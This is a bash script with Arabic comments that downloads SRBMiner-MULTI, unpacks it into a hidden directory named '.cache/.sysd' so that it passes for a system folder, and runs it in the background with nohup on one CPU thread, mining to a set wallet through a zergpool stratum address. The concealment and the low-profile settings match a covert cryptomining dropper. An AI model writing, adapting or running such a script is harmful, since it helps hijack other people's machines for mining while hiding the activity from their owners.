#!/bin/bash

# إعداد بيانات المحفظة والمسبح
WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"   # ← عدّلها لمحفظتك
WORKER="x" 
POOL="stratum+tcp://ghostrider.eu.mine.zergpool.com:5354"
THREADS=1   # ← عدد الأنوية المحدد للتعدين (1 Core)

# مجلد عمل مخفي
WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل SRBMiner-MULTI (Linux x64)
wget -q https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-MULTI-2-4-7-Linux.tar.xz -O srb.tar.xz

# فك الضغط في المجلد المخفي
tar -xf srb.tar.xz --strip=1
rm srb.tar.xz

# تشغيل المعدّن في الخلفية بنواة واحدة
nohup ./SRBMiner-MULTI \
   --algorithm ghostrider \
   --pool $POOL \
   --wallet $WALLET \
   --password c=XNA \
   --cpu-threads-limit $THREADS \
   > cpu_output.log 2>&1 &
